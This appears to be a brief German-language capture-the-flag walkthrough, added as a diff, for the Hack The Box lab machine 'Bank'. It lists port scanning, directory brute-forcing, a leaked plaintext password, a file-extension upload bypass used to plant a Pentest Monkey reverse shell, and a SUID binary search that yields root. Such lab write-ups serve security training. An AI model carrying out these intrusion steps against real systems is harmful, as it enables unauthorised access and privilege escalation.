@@ -1,0 +1,24 @@
+Bank 
+===================
+- nmap:
+  * 22: SSH
+  * 53: Bind
+  * 80: http Apache 2.4.7
+
+- 10.10.10.29 bank.htb  in /etc/hosts eintragen
+- gobuster dir -u http://bank.htb -w directory-list-lowercase-2.3-medium.txt -e
+  => /balance-transfer
+      => *.acc - Dateien
+      => kleinste Datei:
+             "chris@bank.htb"/"!##HTBB4nkP4ssw0rd!##"   
+- bank.htb/login.php als chris
+  => support.php
+      =>Kommentar im Quelltext "I added the file extension .htb to execute as php..."
+  => Reverse Shell  "shell.htb" (Pentest Monkey)
+- cat /home/chris/user.txt
+- find / -perm -u=s -type f > /tmp/out
+   =>/var/htb/bin/emergency
+- ./emergency
+  => Root Shell!
+- cat /root/root.txt
+
